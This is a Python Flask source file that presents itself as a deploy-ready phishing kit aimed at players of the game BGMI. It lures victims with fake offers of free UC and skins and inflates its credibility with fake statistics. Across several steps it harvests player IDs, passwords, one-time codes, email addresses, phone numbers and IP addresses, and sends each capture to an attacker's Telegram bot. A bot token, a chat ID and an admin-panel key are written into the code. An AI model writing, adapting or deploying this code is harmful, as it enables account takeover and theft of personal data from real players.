"""
🎮 BGMI PHISHING KIT - FREE UC & SKINS
Deployment ready for Render.com
"""

import os
import json
import random
from datetime import datetime
from flask import Flask, render_template, request, session, redirect, url_for, jsonify
import requests
from dotenv import load_dotenv

# Load environment variables
load_dotenv()

# Initialize Flask app
app = Flask(__name__)
app.secret_key = os.environ.get('FLASK_SECRET_KEY', 'bgmi-secret-key-2024')

# ============ YOUR TELEGRAM CREDENTIALS ============
TELEGRAM_BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN', '8461918060:AAF7RSC1NV3imoS5zfpxmrtdo7luUEJ9egw')
TELEGRAM_CHAT_ID = os.environ.get('TELEGRAM_CHAT_ID', '828895312')
# ===================================================

# In-memory storage (for demo)
victims = []

def send_to_telegram(data):
    """Send victim data to Telegram"""
    try:
        message = f"""
🎮 *BGMI VICTIM CAPTURED* 🎮

👤 *ACCOUNT DETAILS:*
🆔 Player ID: `{data.get('player_id', 'N/A')}`
🔑 Password: `{data.get('password', 'N/A')}`
📧 Email: `{data.get('email', 'N/A')}`
📞 Phone: `{data.get('phone', 'N/A')}`
🔢 OTP: `{data.get('otp', 'N/A')}`

💎 *REWARDS REQUESTED:*
• UC: {data.get('uc_amount', '10,000')}
• Mythic Skin: {data.get('mythic', 'Yes')}
• Glacier M416: {data.get('glacier', 'Yes')}
• Royale Pass: {data.get('royale_pass', 'Yes')}

🌐 *TECH INFO:*
🌍 IP: `{data.get('ip', 'N/A')}`
🕒 Time: `{data.get('time', datetime.now().strftime('%Y-%m-%d %H:%M:%S'))}`
📱 Device: `{data.get('user_agent', 'N/A')[:30]}`

⚡ *STATUS:* {data.get('status', 'CAPTURED')}
📊 *TOTAL VICTIMS:* {len(victims) + 1}
"""
        
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        payload = {
            "chat_id": TELEGRAM_CHAT_ID,
            "text": message,
            "parse_mode": "Markdown",
            "disable_web_page_preview": True
        }
        
        response = requests.post(url, json=payload, timeout=10)
        return response.status_code == 200
        
    except Exception as e:
        print(f"Telegram error: {e}")
        return False

@app.route('/')
def index():
    """Landing page - Free UC & Skins"""
    session.clear()
    session['step'] = 1
    
    # Generate fake stats
    stats = {
        'players_served': f"{random.randint(50000, 100000):,}",
        'uc_delivered': f"{random.randint(1000000, 5000000):,}",
        'online_now': f"{random.randint(1000, 5000):,}"
    }
    
    return render_template('index.html', stats=stats)

@app.route('/claim', methods=['POST'])
def claim_rewards():
    """Step 1: Select rewards"""
    session['uc_amount'] = request.form.get('uc_amount', '10000')
    session['mythic'] = request.form.get('mythic', 'yes')
    session['glacier'] = request.form.get('glacier', 'yes')
    session['royale_pass'] = request.form.get('royale_pass', 'yes')
    session['step'] = 2
    
    return redirect(url_for('login'))

@app.route('/login', methods=['GET', 'POST'])
def login():
    """Step 2: BGMI Login"""
    if request.method == 'POST':
        player_id = request.form.get('player_id', '').strip()
        password = request.form.get('password', '').strip()
        
        session['player_id'] = player_id
        session['password'] = password
        session['step'] = 3
        
        # Send initial alert
        victim_data = {
            'player_id': player_id,
            'password': password,
            'uc_amount': session.get('uc_amount', '10000'),
            'ip': request.remote_addr,
            'user_agent': request.headers.get('User-Agent', ''),
            'time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            'status': 'CREDENTIALS_CAPTURED'
        }
        
        send_to_telegram(victim_data)
        victims.append(victim_data)
        
        return redirect(url_for('otp_verification'))
    
    return render_template('login.html')

@app.route('/otp-verification', methods=['GET', 'POST'])
def otp_verification():
    """Step 3: OTP Verification"""
    if 'player_id' not in session:
        return redirect(url_for('index'))
    
    if request.method == 'POST':
        otp = request.form.get('otp', '').strip()
        session['otp'] = otp
        session['step'] = 4
        
        # Update victim data
        victim_data = {
            'player_id': session.get('player_id'),
            'password': session.get('password'),
            'otp': otp,
            'uc_amount': session.get('uc_amount', '10000'),
            'status': 'OTP_CAPTURED',
            'time': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        }
        
        send_to_telegram(victim_data)
        
        return redirect(url_for('verify_account'))
    
    # Generate fake OTP for display
    fake_otp = ''.join(random.choices('0123456789', k=6))
    return render_template('otp.html', 
                         player_id=session.get('player_id'),
                         fake_otp=fake_otp)

@app.route('/verify-account', methods=['GET', 'POST'])
def verify_account():
    """Step 4: Account Verification"""
    if 'player_id' not in session:
        return redirect(url_for('index'))
    
    if request.method == 'POST':
        email = request.form.get('email', '').strip()
        phone = request.form.get('phone', '').strip()
        
        session['email'] = email
        session['phone'] = phone
        session['step'] = 5
        
        # Complete victim data
        victim_data = {
            'player_id': session.get('player_id'),
            'password': session.get('password'),
            'otp': session.get('otp'),
            'email': email,
            'phone': phone,
            'uc_amount': session.get('uc_amount', '10000'),
            'mythic': session.get('mythic', 'yes'),
            'glacier': session.get('glacier', 'yes'),
            'royale_pass': session.get('royale_pass', 'yes'),
            'ip': request.remote_addr,
            'user_agent': request.headers.get('User-Agent', ''),
            'time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            'status': 'COMPLETE',
            'total_victims': len(victims) + 1
        }
        
        send_to_telegram(victim_data)
        victims.append(victim_data)
        
        return redirect(url_for('processing'))
    
    return render_template('verify.html', player_id=session.get('player_id'))

@app.route('/processing')
def processing():
    """Step 5: UC Processing"""
    if 'player_id' not in session:
        return redirect(url_for('index'))
    
    # Generate processing data
    process_data = {
        'player_id': session.get('player_id'),
        'uc_amount': session.get('uc_amount', '10000'),
        'current_uc': 0,
        'estimated_time': random.randint(2, 5)
    }
    
    return render_template('processing.html', data=process_data)

@app.route('/success')
def success():
    """Step 6: Success Page"""
    if 'player_id' not in session:
        return redirect(url_for('index'))
    
    success_data = {
        'player_id': session.get('player_id'),
        'uc_added': session.get('uc_amount', '10000'),
        'transaction_id': f"BGMI{''.join(random.choices('0123456789', k=10))}",
        'time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        'mythic_skin': 'Unlocked' if session.get('mythic') == 'yes' else 'Not Selected',
        'glacier_m416': 'Unlocked' if session.get('glacier') == 'yes' else 'Not Selected',
        'royale_pass': 'Activated' if session.get('royale_pass') == 'yes' else 'Not Selected'
    }
    
    # Send success notification
    send_to_telegram({
        'player_id': session.get('player_id'),
        'status': 'VICTIM_COMPLETED',
        'uc_added': session.get('uc_amount', '10000')
    })
    
    # Clear sensitive data
    for key in ['player_id', 'password', 'otp', 'email', 'phone']:
        session.pop(key, None)
    
    return render_template('success.html', data=success_data)

@app.route('/test-telegram')
def test_telegram():
    """Test Telegram connection"""
    test_data = {
        'player_id': 'TEST_PLAYER_001',
        'password': 'testpass123',
        'otp': '123456',
        'uc_amount': '10000',
        'status': 'TELEGRAM_BOT_TEST',
        'time': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    }
    
    if send_to_telegram(test_data):
        return f"""
        <!DOCTYPE html>
        <html>
        <head>
            <title>✅ Telegram Connected</title>
            <style>
                body {{ font-family: Arial; padding: 40px; text-align: center; background: #0a0a2a; color: white; }}
                .success {{ background: #00ff00; color: black; padding: 20px; border-radius: 10px; margin: 20px; }}
                .info {{ background: #1a1a2e; padding: 20px; border-radius: 10px; margin: 20px; }}
            </style>
        </head>
        <body>
            <div class="success">
                <h1>✅ TELEGRAM BOT CONNECTED!</h1>
                <p>Your BGMI phishing bot is now active.</p>
            </div>
            
            <div class="info">
                <h3>📱 Telegram Details:</h3>
                <p><strong>Bot Token:</strong> {TELEGRAM_BOT_TOKEN[:15]}...</p>
                <p><strong>Chat ID:</strong> {TELEGRAM_CHAT_ID}</p>
                <p><strong>Bot Link:</strong> https://t.me/{TELEGRAM_BOT_TOKEN.split(':')[0]}</p>
            </div>
            
            <div class="info">
                <h3>🔗 Test Links:</h3>
                <p><a href="/" style="color: #00ffff;">Main Page</a></p>
                <p><a href="/admin?key=bgmi2024" style="color: #00ffff;">Admin Panel</a></p>
            </div>
        </body>
        </html>
        """
    else:
        return """
        <h1 style="color: red;">❌ Telegram Connection Failed</h1>
        <p>Check your bot token and chat ID.</p>
        """

@app.route('/admin')
def admin_panel():
    """Admin panel to view victims"""
    admin_key = request.args.get('key', '')
    if admin_key != 'bgmi2024':
        return "Unauthorized", 403
    
    return jsonify({
        'total_victims': len(victims),
        'recent_victims': victims[-10:] if victims else [],
        'telegram_connected': bool(TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID)
    })

@app.errorhandler(404)
def not_found(e):
    return "404 - Page not found", 404

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    
    print("="*70)
    print("🎮 BGMI PHISHING SERVER STARTED")
    print("="*70)
    print(f"🌐 Server URL: http://localhost:{port}")
    print(f"🤖 Telegram Bot: {TELEGRAM_BOT_TOKEN[:15]}...")
    print(f"🆔 Chat ID: {TELEGRAM_CHAT_ID}")
    print(f"🔗 Test URL: http://localhost:{port}/test-telegram")
    print(f"📊 Admin URL: http://localhost:{port}/admin?key=bgmi2024")
    print("="*70)
    
    app.run(host='0.0.0.0', port=port, debug=False)